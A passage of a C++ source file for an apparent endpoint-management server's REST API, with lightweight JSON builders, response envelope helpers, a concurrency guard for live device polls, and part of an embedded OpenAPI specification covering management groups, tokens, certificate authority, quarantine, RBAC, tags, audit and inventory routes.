#include "rest_api_v1.hpp"
#include "baseline_store.hpp" // baseline-anchored per-device Guardian status route
#include "bundle_orchestrator.hpp" // live-query bundle (ADR-0011): dispatch + collate
#include "bundle_service.hpp"      // validate_bundle_steps / aggregate_to_json
#include "dex_routes.hpp" // dex_window_to_days / dex_iso_since (shared window resolver)
#include "live_kinds.hpp" // shared live-read kind table + wire-format parser (S2)
#include "event_bus.hpp"
#include "execution_event_bus.hpp"
#include "guardian_rule_spec.hpp"
#include "guardian_schema_registry.hpp"
#include "http_route_sink.hpp"
#include "inventory_eval.hpp"
#include "rest_a4_envelope.hpp"
#include "rest_audit.hpp" // detail::emit_behavioral_audit (Sec-Audit-Failed, #1647)
#include "response_templates_engine.hpp"
#include "software_inventory_store.hpp" // ADR-0016: typed installed-software fleet read
#include "store_errors.hpp"
#include "visualization_engine.hpp"

#include <yuzu/server/auth_db.hpp> // is_valid_username

// nlohmann/json is retained ONLY for parsing request bodies (json::parse).
// All response JSON is built via the lightweight JObj/JArr helpers below,
// which produce strings directly and avoid the template-instantiation
// explosion that caused 56 GB+ compiler memory usage.
#include <nlohmann/json.hpp>
#include <spdlog/spdlog.h>

#include <algorithm>
#include <atomic>
#include <cctype>
#include <charconv>
#include <chrono>
#include <thread>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <format>
#include <memory>
#include <random>
#include <regex>
#include <stdexcept>
#include <string>
#include <string_view>
#include <system_error>
#include <unordered_map>
#include <unordered_set>

namespace yuzu::server {
namespace {

// ── Lightweight JSON string builder ─────────────────────────────────────
// Produces JSON output strings directly, bypassing nlohmann::json template
// instantiation for construction.  Only ~80 lines vs 23 000 lines of
// template machinery — compiles in milliseconds, not minutes.

void json_escape(std::string& out, std::string_view sv) {
    out.reserve(out.size() + sv.size());
    for (char c : sv) {
        switch (c) {
        case '"':
            out += "\\\"";
            break;
        case '\\':
            out += "\\\\";
            break;
        case '\b':
            out += "\\b";
            break;
        case '\f':
            out += "\\f";
            break;
        case '\n':
            out += "\\n";
            break;
        case '\r':
            out += "\\r";
            break;
        case '\t':
            out += "\\t";
            break;
        default:
            if (static_cast<unsigned char>(c) < 0x20) {
                char hex[8];
                std::snprintf(hex, sizeof(hex), "\\u%04x",
                              static_cast<unsigned int>(static_cast<unsigned char>(c)));
                out += hex;
            } else {
                out += c;
            }
        }
    }
}

/// JSON object builder.  Usage: JObj().add("k",v).add("k2",v2).str()
class JObj {
    std::string buf_;
    int n_ = 0;

    void pre() { buf_ += (n_++ ? ',' : '{'); }
    void key(std::string_view k) {
        pre();
        buf_ += '"';
        json_escape(buf_, k);
        buf_ += "\":";
    }

public:
    JObj() = default;

    JObj& add(std::string_view k, std::string_view v) {
        key(k);
        buf_ += '"';
        json_escape(buf_, v);
        buf_ += '"';
        return *this;
    }
    JObj& add(std::string_view k, const std::string& v) { return add(k, std::string_view(v)); }
    JObj& add(std::string_view k, const char* v) { return add(k, std::string_view(v)); }
    JObj& add(std::string_view k, int64_t v) {
        key(k);
        buf_ += std::to_string(v);
        return *this;
    }
    JObj& add(std::string_view k, int v) { return add(k, static_cast<int64_t>(v)); }
    JObj& add(std::string_view k, double v) {
        key(k);
        buf_ += std::format("{:.2f}", v);
        return *this;
    }
    JObj& add(std::string_view k, bool v) {
        key(k);
        buf_ += v ? "true" : "false";
        return *this;
    }
    /// Embed a pre-serialized JSON fragment (object, array, literal).
    JObj& raw(std::string_view k, std::string_view json) {
        key(k);
        buf_ += json;
        return *this;
    }

    [[nodiscard]] std::string str() const { return n_ ? buf_ + '}' : "{}"; }
};

/// JSON array builder.
class JArr {
    std::string buf_;
    int n_ = 0;

public:
    JArr() = default;

    JArr& add(const JObj& obj) {
        buf_ += (n_++ ? ',' : '[');
        buf_ += obj.str();
        return *this;
    }
    JArr& add(std::string_view s) {
        buf_ += (n_++ ? ',' : '[');
        buf_ += '"';
        json_escape(buf_, s);
        buf_ += '"';
        return *this;
    }
    JArr& add_raw(std::string_view json) {
        buf_ += (n_++ ? ',' : '[');
        buf_ += json;
        return *this;
    }

    [[nodiscard]] std::string str() const { return n_ ? buf_ + ']' : "[]"; }
    [[nodiscard]] int64_t size() const { return n_; }
};

// ── Envelope helpers ────────────────────────────────────────────────────

std::string ok_json(std::string_view data_json) {
    return JObj().raw("data", data_json).raw("meta", R"({"api_version":"v1"})").str();
}

std::string error_json(std::string_view message, int code = 0) {
    JObj j;
    if (code != 0) {
        auto err = JObj().add("code", code).add("message", message).str();
        j.raw("error", err);
    } else {
        j.add("error", message);
    }
    j.raw("meta", R"({"api_version":"v1"})");
    return j.str();
}

std::string list_json(std::string_view data_json, int64_t total, int64_t start = 0,
                      int64_t page_size = 50) {
    auto pag = JObj().add("total", total).add("start", start).add("page_size", page_size).str();
    return JObj()
        .raw("data", data_json)
        .raw("pagination", pag)
        .raw("meta", R"({"api_version":"v1"})")
        .str();
}

// Render a live plugin output into the JSON `data` object for /dex/devices/{id}/live.
// The wire-format parsing (kind table + field extraction) is shared with the
// dashboard HTML path via live_kinds.hpp so the two cannot drift (governance S2);
// this only maps the parsed fields to JSON. The agent sanitizes '|'/CR/LF out of
// every field, and the parser is bounds-safe on any input regardless.
std::string live_result_json(const std::string& kind, const std::string& output) {
    if (kind == "uptime") {
        const auto u = live::parse_uptime(output);
        JObj o;
        o.add("kind", "uptime");
        if (u.display)
            o.add("uptime_display", *u.display);
        if (u.seconds)
            o.add("uptime_seconds", *u.seconds);
        return o.str();
    }
    JArr procs;
    for (const auto& p : live::parse_processes(output))
        procs.add(
            JObj().add("pid", p.pid).add("name", p.name).add("sha256", p.sha256).add("path", p.path));
    return JObj().add("kind", "processes").raw("processes", procs.str()).str();
}

// Bound concurrent /api/v1/dex/devices/{id}/live polls (UP-1/2/3): each call pins
// an httplib worker for up to ~20s, so an unbounded burst (or SSE pre-pressure)
// would starve the dashboard, REST and the health probes. The cap is a whole-server
// in-flight budget held strictly below the worker pool; over-budget callers get 429
// + retry_after_ms instead of dispatching a command they can't wait for. RAII so
// EVERY exit path (429/400/502/503/504/200) releases the slot — a leaked slot would
// permanently shrink capacity. `acquired` records whether we were within budget.
class LiveInflightGuard {
public:
    // `gauge` (optional) mirrors the current in-flight depth for observability —
    // updated to the live atomic value on acquire and release so an operator can see
    // saturation approaching the cap (sre S1). Borrowed; the registry outlives the
    // handler.
    explicit LiveInflightGuard(yuzu::Gauge* gauge = nullptr) : gauge_(gauge) {
        const int cap = detail::live_max_inflight().load(std::memory_order_relaxed);
        acquired_ = inflight_.fetch_add(1, std::memory_order_acq_rel) < cap;
        if (gauge_)
            gauge_->set(inflight_.load(std::memory_order_relaxed));
    }
    ~LiveInflightGuard() {
        inflight_.fetch_sub(1, std::memory_order_acq_rel);
        if (gauge_)
            gauge_->set(inflight_.load(std::memory_order_relaxed));
    }
    LiveInflightGuard(const LiveInflightGuard&) = delete;
    LiveInflightGuard& operator=(const LiveInflightGuard&) = delete;
    bool acquired() const { return acquired_; }

private:
    yuzu::Gauge* gauge_{nullptr};
    static inline std::atomic<int> inflight_{0};
    bool acquired_{false};
};

// A4 / event-envelope helpers move to `yuzu::server::detail` below —
// declared in `rest_a4_envelope.hpp` so unit tests can assert the shape
// directly without driving the httplib chunked content provider.

// ── OpenAPI 3.0 spec ────────────────────────────────────────────────────
// Returned as a static raw string — zero template instantiation at compile
// time.  Previously this was a 365-line nested nlohmann::json initializer
// list that required 56 GB+ of compiler memory.

const std::string& openapi_spec() {
    static const std::string spec =
        R"json({
  "openapi": "3.0.3",
  "info": {
    "title": "Yuzu Server REST API",
    "version": "1.0.0",
    "description": "Enterprise endpoint management REST API. All endpoints require authentication via session cookie, Bearer token, or X-Yuzu-Token header.",
    "contact": {"name": "Yuzu Project"},
    "license": {"name": "AGPL-3.0-or-later", "url": "https://www.gnu.org/licenses/agpl-3.0.html"}
  },
  "servers": [{"url": "/api/v1", "description": "API v1 base path"}],
  "components": {
    "securitySchemes": {
      "bearerAuth": {"type": "http", "scheme": "bearer", "description": "API token via Authorization: Bearer <token>"},
      "apiKeyHeader": {"type": "apiKey", "in": "header", "name": "X-Yuzu-Token", "description": "API token via X-Yuzu-Token header"},
      "cookieAuth": {"type": "apiKey", "in": "cookie", "name": "session", "description": "Session cookie from /login"}
    },
    "schemas": {
      "ApiEnvelope": {
        "type": "object",
        "properties": {
          "data": {"description": "Response payload"},
          "meta": {"type": "object", "properties": {"api_version": {"type": "string"}}},
          "error": {"type": "string", "description": "Error message (present only on error)"},
          "pagination": {"type": "object", "properties": {
            "total": {"type": "integer"},
            "start": {"type": "integer"},
            "page_size": {"type": "integer"}
          }}
        }
      },
      "ManagementGroup": {
        "type": "object",
        "properties": {
          "id": {"type": "string"},
          "name": {"type": "string"},
          "description": {"type": "string"},
          "parent_id": {"type": "string"},
          "membership_type": {"type": "string", "enum": ["static", "dynamic"]},
          "scope_expression": {"type": "string"},
          "created_by": {"type": "string"},
          "created_at": {"type": "integer"},
          "updated_at": {"type": "integer"}
        }
      },
      "ApiToken": {
        "type": "object",
        "properties": {
          "token_id": {"type": "string"},
          "name": {"type": "string"},
          "principal_id": {"type": "string"},
          "created_at": {"type": "integer"},
          "expires_at": {"type": "integer"},
          "last_used_at": {"type": "integer"},
          "revoked": {"type": "boolean"}
        }
      },
      "Tag": {
        "type": "object",
        "properties": {
          "agent_id": {"type": "string"},
          "key": {"type": "string"},
          "value": {"type": "string"}
        }
      },
      "AuditEvent": {
        "type": "object",
        "properties": {
          "timestamp": {"type": "integer"},
          "principal": {"type": "string"},
          "action": {"type": "string"},
          "result": {"type": "string"},
          "target_type": {"type": "string"},
          "target_id": {"type": "string"},
          "detail": {"type": "string"}
        }
      },
      "InventoryRecord": {
        "type": "object",
        "properties": {
          "agent_id": {"type": "string"},
          "plugin": {"type": "string"},
          "data_json": {"type": "string", "description": "Structured JSON blob from the plugin"},
          "collected_at": {"type": "integer"}
        }
      },
      "InventoryTable": {
        "type": "object",
        "properties": {
          "plugin": {"type": "string"},
          "agent_count": {"type": "integer"},
          "last_collected": {"type": "integer"}
        }
      },
      "ProductPack": {
        "type": "object",
        "properties": {
          "id": {"type": "string"},
          "name": {"type": "string"},
          "version": {"type": "string"},
          "description": {"type": "string"},
          "installed_at": {"type": "integer"},
          "verified": {"type": "boolean", "description": "Whether the pack signature was verified"}
        }
      },
      "ResponseTemplate": {
        "type": "object",
        "required": ["name"],
        "properties": {
          "id": {"type": "string", "description": "32-hex template id; auto-generated on POST when omitted. Reserved id __default__ rejected."},
          "name": {"type": "string", "maxLength": 200},
          "description": {"type": "string"},
          "columns": {"type": "array", "items": {"type": "string"}, "description": "Subset of plugin column names to render. Empty/omitted means show all."},
          "sort": {"type": "object", "properties": {"column": {"type": "string"}, "dir": {"type": "string", "enum": ["asc", "desc"]}}},
          "filters": {"type": "array", "items": {"type": "object", "properties": {"column": {"type": "string"}, "op": {"type": "string", "enum": ["equals", "not_equals", "contains", "starts_with", "ends_with"]}, "value": {"type": "string"}}}},
          "default": {"type": "boolean", "description": "At most one operator template may be marked default per definition."}
        }
      },
      "GuaranteedStateRule": {
        "type": "object",
        "properties": {
          "rule_id": {"type": "string", "description": "Stable operator-chosen id ([A-Za-z0-9._-]+)"},
          "name": {"type": "string"},
          "yaml_source": {"type": "string", "description": "Authoritative rule body (kind: GuaranteedStateRule)"},
          "version": {"type": "integer"},
          "enabled": {"type": "boolean"},
          "enforcement_mode": {"type": "string", "enum": ["enforce", "audit"]},
          "severity": {"type": "string", "enum": ["low", "medium", "high", "critical"]},
          "os_target": {"type": "string", "description": "Empty (any) or one of windows|linux|macos"},
          "scope_expr": {"type": "string", "description": "Scope DSL expression selecting target agents"},
          "created_at": {"type": "string", "format": "date-time"},
          "updated_at": {"type": "string", "format": "date-time"},
          "created_by": {"type": "string"},
          "updated_by": {"type": "string"}
        }
      },
      "GuaranteedStateStatus": {
        "type": "object",
        "properties": {
          "total_rules": {"type": "integer"},
          "compliant_rules": {"type": "integer"},
          "drifted_rules": {"type": "integer"},
          "errored_rules": {"type": "integer"}
        }
      },)json"
        // Split literal: MSVC caps a single string literal at ~16 KB (C2026).
        R"json(
      "GuaranteedStateDeviceComplianceStatus": {
        "type": "object",
        "properties": {
          "baseline": {"type": "object", "properties": {"baseline_id": {"type": "string"}, "name": {"type": "string"}, "lifecycle": {"type": "string", "enum": ["draft", "deployed"]}}},
          "deployed": {"type": "boolean", "description": "lifecycle == deployed; false => consumer shows 'No Baseline Deployed'"},
          "assessable": {"type": "boolean", "description": "Machine-readable go/no-go: true only when deployed AND at least one applicable Guard has reported (total_guards>0). FALSE for a draft Baseline, or a deployed Baseline this device has reported NO applicable Guard against (newly-enrolled / offline / all out-of-scope). When false the consumer MUST NOT compute or render a compliance percentage — this is the machine signal that closes the 0/0 green-wash."},
          "agent_id": {"type": "string"},
          "total_guards": {"type": "integer", "description": "Guards APPLICABLE to this device — the deployed_snapshot intersected with the Guards this device has actually REPORTED (report-driven), NOT the snapshot size and NOT this device's true in-scope count. CAUTION (compliance over-estimate): an in-scope Guard the agent has not yet reported (offline / newly-enrolled / guard crashed before arming) is absent — it drops out of the DENOMINATOR rather than counting as pending — so compliant/total_guards can read falsely high (e.g. 3/3=100% when 7 of 10 in-scope Guards are silent), worst exactly when Guards are broken. Do NOT gate automated remediation on this percentage until the per-device scope_expr computed denominator ships (deferred — see route description); cross-reference snapshot_total, last_updated, and device liveness. NOT-ASSESSABLE: assessable:false."},
          "snapshot_total": {"type": "integer", "description": "The Baseline's full deployed-member count (the SUPERSET across all devices — an upper bound, NOT this device's in-scope count). total_guards <= snapshot_total; a gap is EXPECTED for a per-machine-scoped Baseline, but a large gap is a cue that this device's coverage may be partial (in-scope Guards unreported). The honest per-device denominator needs the deferred scope_expr evaluation."},
          "compliant": {"type": "integer"},
          "drifted": {"type": "integer"},
          "errored": {"type": "integer"},
          "pending": {"type": "integer", "description": "applicable Guards reported with an unrecognized verdict token (e.g. agent newer than server); equals total_guards - (compliant+drifted+errored). Out-of-scope Guards are ABSENT (not pending) in the report-driven model — usually 0 here."},
          "last_updated": {"type": "string", "nullable": true, "description": "max guards[].updated_at — 'compliance as of'; null ONLY when this device has reported no applicable guard. A reported guard contributes its timestamp even if its verdict token is unrecognized (status pending)."},
          "guards": {"type": "array", "items": {"type": "object", "properties": {"rule_id": {"type": "string"}, "name": {"type": "string"}, "status": {"type": "string", "enum": ["compliant", "drifted", "errored", "pending"]}, "updated_at": {"type": "string", "nullable": true, "description": "ISO-8601 this device last reported this guard's verdict; null ONLY when this device has not reported this guard. A reported guard carries its timestamp even when status is pending (unrecognized verdict token)."}}}}
        }
      },)json"
        R"json(
      "GuaranteedStateEvent": {
        "type": "object",
        "properties": {
          "event_id": {"type": "string"},
          "rule_id": {"type": "string"},
          "agent_id": {"type": "string"},
          "event_type": {"type": "string"},
          "severity": {"type": "string"},
          "guard_type": {"type": "string"},
          "guard_category": {"type": "string", "enum": ["event", "condition"]},
          "detected_value": {"type": "string"},
          "expected_value": {"type": "string"},
          "detail_json": {"type": "string", "description": "Structured machine-readable detail, JSON keyed by event_type (route a'); empty for plain drift. For process.crashed: process/pid/kind/exception_code/symbolic/faulting_module/platform."},
          "remediation_action": {"type": "string"},
          "remediation_success": {"type": "boolean"},
          "detection_latency_us": {"type": "integer"},
          "remediation_latency_us": {"type": "integer"},
          "timestamp": {"type": "string", "format": "date-time"}
        }
      },
      "ExecutionSseEvent": {
        "description": "JSON envelope emitted on every /api/v1/events SSE frame (sprint W5.1). Per agentic-first invariant A3 every event carries execution_id and a deterministic step name from the published taxonomy. Real bus events (ExecutionBusEvent) and synthetic frames (ExecutionSyntheticEvent) differ in shape; the discriminator is the `type` field. governance R2 fix for consistency-MED — the previous single-schema form falsely required event_id/timestamp_ms/payload on the synthetic frames.",
        "oneOf": [
          {"$ref": "#/components/schemas/ExecutionBusEvent"},
          {"$ref": "#/components/schemas/ExecutionSyntheticEvent"}
        ],
        "discriminator": {
          "propertyName": "type",
          "mapping": {
            "agent-transition": "#/components/schemas/ExecutionBusEvent",
            "execution-progress": "#/components/schemas/ExecutionBusEvent",
            "execution-completed": "#/components/schemas/ExecutionBusEvent",
            "replay-gap": "#/components/schemas/ExecutionSyntheticEvent",
            "events-dropped": "#/components/schemas/ExecutionSyntheticEvent"
          }
        }
      },
      "ExecutionBusEvent": {
        "type": "object",
        "description": "Envelope for a real ExecutionEventBus event (agent-transition / execution-progress / execution-completed). The payload field raw-embeds the original publisher data; for malformed or oversized publisher payloads the helper substitutes null so the envelope stays valid JSON.",
        "required": ["execution_id", "event_id", "timestamp_ms", "type", "payload"],
        "properties": {
          "execution_id": {"type": "string"},
          "event_id": {"type": "integer", "format": "int64", "description": "Monotonic per-execution; use on reconnect via Last-Event-ID header or ?since= query."},
          "timestamp_ms": {"type": "integer", "format": "int64", "description": "Wall-clock epoch milliseconds."},
          "type": {"type": "string", "enum": ["agent-transition", "execution-progress", "execution-completed"]},
          "payload": {"description": "Event-type-specific structured payload from the bus publisher, or null when the publisher payload was malformed or exceeded the 64KiB size cap.", "nullable": true}
        }
      },
      "ExecutionSyntheticEvent": {
        "type": "object",
        "description": "Synthetic envelope generated by the route handler (NOT by the bus) to signal a client-relevant condition. `replay-gap` indicates the bus ring buffer evicted events the client requested; `events-dropped` indicates the per-connection queue cap dropped events from THIS connection. Neither carries event_id/timestamp_ms/payload — instead they carry the type-specific fields below. The SSE `heartbeat` frame is also synthetic but is NOT a JSON envelope (data: line is empty) and is not represented here.",
        "required": ["execution_id", "type"],
        "properties": {
          "execution_id": {"type": "string"},
          "type": {"type": "string", "enum": ["replay-gap", "events-dropped"]},
          "missing_from": {"type": "integer", "format": "int64", "description": "Lowest event_id the client requested but the bus could no longer replay (replay-gap only)."},
          "missing_to": {"type": "integer", "format": "int64", "description": "Highest event_id in the eviction gap (replay-gap only)."},
          "dropped_count": {"type": "integer", "format": "int64", "description": "Number of events dropped from the per-connection queue since the last events-dropped frame on this connection (events-dropped only)."},
          "reason": {"type": "string", "description": "Free-text drop reason; currently always 'per-connection queue cap exceeded' (events-dropped only)."}
        }
      },
      "A4ErrorEnvelope": {
        "type": "object",
        "description": "Agentic-first error envelope (sprint W5.1; A4 invariant in docs/agentic-first-principle.md). Used by /api/v1/events on every 4xx/5xx response and reserved for future A4-backfill of other /api/v1/* endpoints.",
        "required": ["error", "meta"],
        "properties": {
          "error": {
            "type": "object",
            "required": ["code", "message", "correlation_id"],
            "properties": {
              "code": {"type": "integer", "description": "HTTP status code echoed into the body for self-describing error frames."},
              "message": {"type": "string", "description": "One-sentence human-readable summary."},
              "correlation_id": {"type": "string", "description": "Server-issued grep token of form `req-<hex-ms>-<hex-seq>`. Also echoed in the X-Correlation-Id response header and (when audit emits) the audit row detail field."},
              "retry_after_ms": {"type": ["integer", "null"], "format": "int64", "description": "Always present in an A4 error body; null unless the condition is retryable, in which case it advises the worker to back off this many milliseconds before retrying (e.g. 503 warmup)."},
              "remediation": {"type": "string", "description": "Optional natural-language hint for self-recovery."}
            }
          },
          "meta": {"type": "object", "properties": {"api_version": {"type": "string"}}}
        }
      }
    }
  },
  "security": [{"bearerAuth": [], "apiKeyHeader": [], "cookieAuth": []}],
  "paths": {
    "/me": {
      "get": {"summary": "Get current user info", "tags": ["Authentication"], "responses": {"200": {"description": "Current user details"}}}
    },
    "/management-groups": {
      "get": {"summary": "List management groups", "tags": ["Management Groups"], "responses": {"200": {"description": "List of management groups"}}},
      "post": {"summary": "Create a management group", "tags": ["Management Groups"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"$ref": "#/components/schemas/ManagementGroup"}}}}, "responses": {"201": {"description": "Group created"}}}
    },
    "/management-groups/{id}": {
      "get": {"summary": "Get a management group with members", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Management group details"}, "404": {"description": "Group not found"}}},
      "put": {"summary": "Update a management group", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Group updated"}}},
      "delete": {"summary": "Delete a management group", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Group deleted"}}}
    },
    "/management-groups/{id}/members": {
      "post": {"summary": "Add member to management group", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"201": {"description": "Member added"}}}
    },
    "/management-groups/{id}/members/{agent_id}": {
      "delete": {"summary": "Remove member from management group", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "agent_id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Member removed"}}}
    },
    "/management-groups/{id}/roles": {
      "get": {"summary": "List roles assigned to a management group", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "List of role assignments"}}},
      "post": {"summary": "Assign a role on a management group", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"201": {"description": "Role assigned"}}},
      "delete": {"summary": "Unassign a role from a management group", "tags": ["Management Groups"], "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Role unassigned"}}}
    })json"
        // Split here so each raw-string literal stays under MSVC's 16,380-byte
        // C2026 cap. Adjacent string literals are concatenated at compile time,
        // so the emitted OpenAPI JSON is byte-identical to the unsplit form.
        R"json(,
    "/tokens": {
      "get": {"summary": "List API tokens for current user", "tags": ["API Tokens"], "responses": {"200": {"description": "List of API tokens"}, "503": {"description": "Token store unavailable (service unavailable)"}}},
      "post": {"summary": "Create a new API token", "tags": ["API Tokens"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "properties": {"name": {"type": "string"}, "expires_at": {"type": "integer"}, "scope_service": {"type": "string"}}}}}}, "responses": {"201": {"description": "Token created, includes plaintext token (shown once)"}, "503": {"description": "Token store unavailable (service unavailable)"}}}
    },
    "/tokens/{token_id}": {
      "delete": {"summary": "Revoke an API token", "tags": ["API Tokens"], "parameters": [{"name": "token_id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Token revoked"}, "503": {"description": "Token store unavailable (service unavailable)"}}}
    },
    "/ca/root": {
      "get": {"summary": "Internal CA root certificate (PEM, public)", "tags": ["Security"], "responses": {"200": {"description": "PEM CA certificate", "content": {"application/x-pem-file": {}}}, "404": {"description": "No CA root"}}}
    },
    "/ca/crl": {
      "get": {"summary": "Internal CA certificate revocation list (DER, public)", "tags": ["Security"], "responses": {"200": {"description": "DER-encoded CRL", "content": {"application/pkix-crl": {}}}, "503": {"description": "CRL unavailable"}}}
    },
    "/ca/issued": {
      "get": {"summary": "List certificates issued by the internal CA", "tags": ["Security"], "parameters": [{"name": "limit", "in": "query", "schema": {"type": "integer", "default": 200, "minimum": 1, "maximum": 1000}}, {"name": "offset", "in": "query", "schema": {"type": "integer", "default": 0}}], "responses": {"200": {"description": "Issued-certificate inventory: {items, count, meta:{api_version, limit, offset, has_more, next_offset?}}. has_more=true when more rows exist beyond this page; next_offset is present only then."}, "403": {"description": "Requires Security:Read"}}}
    },
    "/ca/revoke": {
      "post": {"summary": "Revoke a certificate by serial", "tags": ["Security"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "required": ["serial_hex"], "properties": {"serial_hex": {"type": "string"}, "reason": {"type": "string"}}}}}}, "responses": {"200": {"description": "Revoked; CRL republished"}, "403": {"description": "Requires Security:Delete"}, "404": {"description": "Serial not found or already revoked"}}}
    },
    "/ca/root-csr": {
      "get": {"summary": "Export the install CA's CSR for enterprise (subordinate-CA) signing", "tags": ["Security"], "responses": {"200": {"description": "PKCS#10 CSR (application/pkcs10), over the existing CA key"}, "403": {"description": "Requires Security:Read"}, "500": {"description": "CSR generation failed"}, "503": {"description": "CA unavailable"}}}
    },
    "/ca/import-chain": {
      "post": {"summary": "Import an enterprise-signed intermediate + parent chain (switch to subordinate mode)", "tags": ["Security"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "required": ["intermediate_pem", "chain_pem"], "properties": {"intermediate_pem": {"type": "string", "description": "This CA's key signed by the enterprise root (must be CA:TRUE)"}, "chain_pem": {"type": "string", "description": "Parent chain: enterprise root [+ intermediates]"}}}}}}, "responses": {"200": {"description": "Validated; issuing identity switched to subordinate, CRL republished"}, "400": {"description": "Bad JSON / missing field / unparseable intermediate"}, "403": {"description": "Requires Security:Write"}, "409": {"description": "No existing CA to subordinate"}, "422": {"description": "Intermediate is not a CA / does not carry this CA's key / does not verify to the chain"}, "413": {"description": "Body too large"}, "503": {"description": "CA unavailable"}}}
    },
    "/quarantine": {
      "get": {"summary": "List quarantined devices", "tags": ["Security"], "responses": {"200": {"description": "List of quarantined devices"}}},
      "post": {"summary": "Quarantine a device", "tags": ["Security"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "properties": {"agent_id": {"type": "string"}, "reason": {"type": "string"}, "whitelist": {"type": "string"}}}}}}, "responses": {"201": {"description": "Device quarantined"}}}
    },
    "/quarantine/{agent_id}": {
      "delete": {"summary": "Release a device from quarantine", "tags": ["Security"], "parameters": [{"name": "agent_id", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Device released"}}}
    },
    "/rbac/roles": {
      "get": {"summary": "List RBAC roles", "tags": ["RBAC"], "responses": {"200": {"description": "List of roles"}}}
    },
    "/rbac/roles/{role}/permissions": {
      "get": {"summary": "Get permissions for a role", "tags": ["RBAC"], "parameters": [{"name": "role", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "List of permissions"}}}
    },
    "/rbac/check": {
      "post": {"summary": "Check if current user has a permission", "tags": ["RBAC"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"type": "object", "properties": {"securable_type": {"type": "string"}, "operation": {"type": "string"}}}}}}, "responses": {"200": {"description": "Permission check result"}}}
    },
    "/tag-categories": {
      "get": {"summary": "List tag categories and allowed values", "tags": ["Tags"], "responses": {"200": {"description": "List of tag categories"}}}
    },
    "/tag-compliance": {
      "get": {"summary": "Get tag compliance gaps", "tags": ["Tags"], "responses": {"200": {"description": "Agents with missing required tags"}}}
    },
    "/tags": {
      "get": {"summary": "Get tags for an agent", "tags": ["Tags"], "parameters": [{"name": "agent_id", "in": "query", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Tag key-value map"}}},
      "put": {"summary": "Set a tag on an agent", "tags": ["Tags"], "requestBody": {"required": true, "content": {"application/json": {"schema": {"$ref": "#/components/schemas/Tag"}}}}, "responses": {"200": {"description": "Tag set"}}}
    },
    "/tags/{agent_id}/{key}": {
      "delete": {"summary": "Delete a tag from an agent", "tags": ["Tags"], "parameters": [{"name": "agent_id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "key", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Tag deleted"}}}
    },
    "/definitions": {
      "get": {"summary": "List instruction definitions", "tags": ["Instructions"], "responses": {"200": {"description": "List of instruction definitions"}}}
    },
    "/audit": {
      "get": {"summary": "Query audit log", "tags": ["Audit"], "parameters": [{"name": "limit", "in": "query", "schema": {"type": "integer", "default": 100}}, {"name": "principal", "in": "query", "schema": {"type": "string"}}, {"name": "action", "in": "query", "schema": {"type": "string"}}], "responses": {"200": {"description": "List of audit events"}}}
    },
    "/audit/auth-sample": {
      "get": {"summary": "Sampled authentication-log evidence export (SOC 2 CC7.2)", "tags": ["Audit"], "description": "Pseudo-random sample of authentication-surface audit events (action prefixes auth./mfa./session.) over an optional [from,to] window. Requires AuditLog:Read. The export is itself audited as audit.auth_sample.exported. SAMPLING NOTE: the sample is drawn from at most the 10000 most-recent matching events in the window; when the window holds more than that, the sample is recency-biased (NOT uniform over the full window). The response `sampling` object reports `candidates_considered`, `scan_cap`, and `recency_capped` so evidence consumers can detect this. Samples are non-reproducible (no seed); the audited `audit.auth_sample.exported` row is the chain-of-custody record.", "parameters": [{"name": "from", "in": "query", "schema": {"type": "integer"}, "description": "Window start, epoch seconds (optional, digits only)"}, {"name": "to", "in": "query", "schema": {"type": "integer"}, "description": "Window end, epoch seconds (optional, digits only)"}, {"name": "limit", "in": "query", "schema": {"type": "integer", "default": 100, "maximum": 1000}}], "responses": {"200": {"description": "Sampled list of auth audit events; envelope adds a `sampling` object (candidates_considered, scan_cap, recency_capped)"}, "400": {"description": "from/to not non-negative digits, from>to, or non-integer limit"}, "503": {"description": "Audit store unavailable"}}}
    },
    "/inventory/tables": {
      "get": {"summary": "List available inventory data types", "tags": ["Inventory"], "description": "Lists distinct plugins that have reported inventory data, with agent counts and last collection timestamps.", "responses": {"200": {"description": "List of inventory tables", "content": {"application/json": {"schema": {"$ref": "#/components/schemas/InventoryTable"}}}}}}
    },
    "/inventory/{agent_id}/{plugin}": {
      "get": {"summary": "Get inventory data for a specific agent and plugin", "tags": ["Inventory"], "parameters": [{"name": "agent_id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "plugin", "in": "path", "required": true, "schema": {"type": "string"}}], "responses": {"200": {"description": "Inventory record"}, "404": {"description": "No inventory data found"}}}
    },
    "/inventory/query": {
